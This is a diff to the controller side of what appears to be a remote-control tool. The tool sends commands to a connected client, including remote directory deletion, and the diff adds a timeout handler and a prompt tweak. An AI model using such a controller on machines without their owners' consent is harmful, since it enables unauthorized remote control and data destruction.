@@ -220,7 +220,7 @@ def Delete():
         print("(File Deleted)\n")
 
     elif (choice == "d"):
-        send(b"del-dir"); directory = input("Remote Directory: "); input("[Enter to Delete]"); send(directory.encode()); ClientResponse = recv(1024).decode()
+        send(b"del-dir"); directory = input("Remote Directory: "); input("\n[Enter to Delete]"); send(directory.encode()); ClientResponse = recv(1024).decode()
         if not (ClientResponse == "success"):
             print("(Non-Existent Directory)\n")
             return
@@ -279,6 +279,9 @@ def RemoteCommands():
 
         except KeyboardInterrupt:
             send(b"append-connection"); print("\n(Keyboard Interrupted, Connection Appended)\n"); exit(0)
+
+        except ConnectionAbortedError as e: # Client timeouts after 3 minute period
+            print("\n[-] No Commands were sent within 3 minutes, Connection Appended\n" + f"Error Message: {e}\n"); exit(1)
 
         except (socket.error, Exception) as e:
             print(f"\n[-] Lost Connection to ({ClientInfo[0]})\n" + f"Error Message: {e}\n"); exit(1)
